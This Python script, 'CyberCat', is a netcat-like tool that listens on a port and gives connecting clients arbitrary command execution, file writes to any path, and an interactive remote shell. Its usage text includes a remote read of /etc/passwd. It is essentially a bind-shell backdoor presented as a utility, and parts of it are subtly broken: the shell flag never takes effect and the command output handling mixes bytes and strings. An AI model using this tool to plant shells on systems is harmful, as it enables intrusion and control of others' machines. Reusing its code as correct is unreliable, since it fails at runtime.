#!/usr/bin/env python3
import sys
import socket
import getopt
import threading
import subprocess

# Define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("CyberCat is a command-line network utility for listening on ports, executing remote commands, uploading files, and providing interactive command shell access to remote systems.")
    print("Usage: \ncybercat.py -t target_host -p port")
    print("-l --listen - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-u --upload=destination - upon receiving connection upload a file and write to [destination]")
    print()
    print("Examples: ")
    print("cybercat.py -t 192.168.0.1 -p 5555 -l -c")
    print("cybercat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print('cybercat.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"')
    print('echo "ABCD" | ./cybercat.py -t 192.168.0.1 -p 135')

def main():
    global listen
    global port
    global execute
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
        sys.exit()

    # Read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute=", "target=", "port=", "command", "upload="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit(2)

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # Are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        # Read in buffer from the commandline
        # This will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()
        # Send data off
        client_sender(buffer)

    # We are going to listen and potentially upload things, execute commands, and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()

# Client sender
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode())
        while True:
            # Now wait for data back
            response = ""
            while True:
                data = client.recv(4096).decode()
                if not data:
                    break
                response += data
                if len(data) < 4096:
                    break
            print(response)

            # Wait for more input
            buffer = input("")
            buffer += "\n"

            # Send it off
            client.send(buffer.encode())
    except Exception as e:
        print(f"[*] Exception: {e}")
        # Tear down the connection
        client.close()

def server_loop():
    global target

    # If no target is defined, we listen on all interfaces
    if not target:
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    print("[*] listening on %s:%s"%(target,port))

    while True:
        client_socket, addr = server.accept()

        # Spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # Trim the newline
    command = command.rstrip()
    # Run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError:
        output = "Failed to execute command.\r\n"

    # Send the output back to the client
    return output

# File uploads and command shell
def client_handler(client_socket):
    global upload_destination
    global execute
    global command

    # Check for upload
    if upload_destination:
        # Read in all the bytes and write to our destination
        file_buffer = b""

        # Keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data

        # Now we take these bytes and try to write them out
        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)
            # Acknowledge that we wrote the file out
            client_socket.send(f"Successfully saved file to {upload_destination}\r\n".encode())
        except Exception as e:
            client_socket.send(f"Failed to save file to {upload_destination}\r\n".encode())
            print(f"[*] Exception: {e}")

    # Check for command execution
    if execute:
        # Run the command
        output = run_command(execute)
        client_socket.send(output.encode())

    # Now we go into another loop if a command shell was requested
    if command:
        while True:
            # Show a simple prompt
            client_socket.send(b"<cc:# ")

            # Now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            # Send back the command output
            response = run_command(cmd_buffer)
            client_socket.send(response.encode())
main()